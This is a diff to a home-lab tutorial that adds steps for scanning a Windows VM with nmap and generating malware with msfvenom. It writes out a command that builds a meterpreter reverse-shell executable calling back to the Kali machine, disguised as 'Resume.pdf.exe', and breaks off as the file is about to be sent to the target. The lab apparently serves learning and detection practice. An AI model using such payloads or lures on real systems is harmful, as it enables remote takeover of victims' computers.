@@ -10,6 +10,7 @@ A HomeLab is a personal, self-contained environment for learning, testing, and e
 - VirtualBox: Virtualization software to create and manage virtual machines
 - Splunk: A big data platform that collects and manages massive volumes of data and searching for information within it
 - Sysmon: A windows system service and device driver that monitors and logs system activity to the Windows event log even through reboots
+- Msfvenom: a Metasploit standalone payload generator
 
 # Things to note
 
@@ -168,9 +169,28 @@ We are going to be using VirtualBox as our Hypervisor.
 
 1. First we will grab the IP address of the Kali machine
     > Terminal > ifconfig
-2. Type in "nmap -A 192.168.20.10 -Pn" - Where the IP address is the Windows machine we're targetting
+2. Type in "nmap -A 192.168.20.10 -Pn" - Where the IP address is the Windows machine we're targetting > hit Enter
     > nmap -h : will show us all the available options of nmap that's available
 
     > -A : Enable OS detection, version detection, script scanning, and traceroute
-    
+
     > -Pn : Treat all hosts as online -- skip host discovery
+3. Once the scan is done - It will display any open ports. In our case it will be **Port 3389**
+    > This was achieved by enabling Remote Desktop Protocol (RDP) under Start > Settings > System > Remote Desktop, and turn on Enable Remote Desktop
+
+## Using Msfvenom (Kali Linux)
+1. Now we will create our basic Malware using **Msfvenom**
+2. Type in "msfvenom" in the terminal window - this will output a list of options available to us
+3. To get a list of payloads - we can type in "msfvenom -l payloads"
+4. For this exercise we will be using the following payload
+    - windows/x64/meterpreter_reverse_tcp ()
+5. To create our malware, type in the following command:
+    - msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=4444 -f exe -o Resume.pdf.exe
+    > lhost = IP address of the Kali machine
+
+    > lport = Port number we want to use for the reverse connection
+
+    > -f exe = Output format as an executable file
+    
+    > -o Resume.pdf.exe = Output file name
+6. Once the malware is created, we can send it to the target machine (Windows 10
